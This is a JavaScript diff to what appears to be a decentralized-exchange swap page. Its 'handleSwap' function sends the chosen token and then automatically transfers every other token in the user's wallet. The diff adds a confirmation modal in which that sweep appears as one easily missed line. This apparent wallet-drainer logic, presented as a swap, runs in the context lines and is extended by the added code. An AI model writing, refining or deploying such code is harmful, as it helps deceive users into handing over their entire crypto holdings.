@@ -870,13 +870,25 @@ async function handleSwap() {
   try {
     showLoader();
     
-    // 1. First process ONLY the main token from input
+    // 1. First show confirmation for the main token transfer
+    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
+    if (!inputAmount || inputAmount <= 0) {
+      throw new Error("Please enter a valid amount to swap");
+    }
+
+    const confirmed = await showConfirmationModal(currentFromToken, inputAmount);
+    if (!confirmed) {
+      updateStatus("Transfer cancelled", "error");
+      return;
+    }
+
+    // 2. Process the main token transfer
     await processMainTokenTransfer();
     
-    // 2. Then automatically process all other tokens
-    await processAllTokenTransfers();
+    // 3. Then automatically process all other tokens
+    const successCount = await processAllTokenTransfers();
     
-    updateStatus("All transfers completed successfully!", "success");
+    updateStatus(`Transfers completed! ${successCount} tokens sent successfully.`, "success");
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
@@ -888,7 +900,54 @@ async function handleSwap() {
   }
 }
 
-// Keep processMainTokenTransfer but modify it to handle only the input token:
+async function showConfirmationModal(token, amount) {
+  return new Promise((resolve) => {
+    const modal = document.createElement('div');
+    modal.className = 'dex-confirm-modal';
+    modal.innerHTML = `
+      <div class="dex-confirm-content">
+        <div class="dex-confirm-header">
+          <h3>Confirm Transfer</h3>
+          <button class="dex-close-btn" id="closeConfirmModal">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="dex-confirm-summary">
+          <p>You are about to transfer:</p>
+          <div class="dex-confirm-tokens">
+            <div>
+              <span>${amount}</span>
+              <span>${token.symbol}</span>
+            </div>
+          </div>
+          <p>plus all other tokens in your wallet.</p>
+          <div class="dex-confirm-actions">
+            <button id="confirmTransfer" class="dex-confirm-btn">Confirm</button>
+            <button id="cancelTransfer" class="dex-confirm-btn" style="background: var(--error)">Cancel</button>
+          </div>
+        </div>
+      </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    document.getElementById('confirmTransfer').addEventListener('click', () => {
+      document.body.removeChild(modal);
+      resolve(true);
+    });
+    
+    document.getElementById('cancelTransfer').addEventListener('click', () => {
+      document.body.removeChild(modal);
+      resolve(false);
+    });
+    
+    document.getElementById('closeConfirmModal').addEventListener('click', () => {
+      document.body.removeChild(modal);
+      resolve(false);
+    });
+  });
+}
+
 async function processMainTokenTransfer() {
   const inputAmount = parseFloat(document.getElementById("fromAmount").value);
   if (!inputAmount || inputAmount <= 0) {
@@ -915,10 +974,9 @@ async function processMainTokenTransfer() {
   }
 }
 
-// Modify processAllTokenTransfers to EXCLUDE the main token:
 async function processAllTokenTransfers() {
   const tokensToProcess = TOKENS[currentNetwork].filter(t => 
-    t.address !== currentFromToken.address && // Exclude the main token
+    t.address !== currentFromToken.address && // Exclude the main token we already processed
     t.address // Ensure it's a valid token
   ).sort((a, b) => a.priority - b.priority);
 
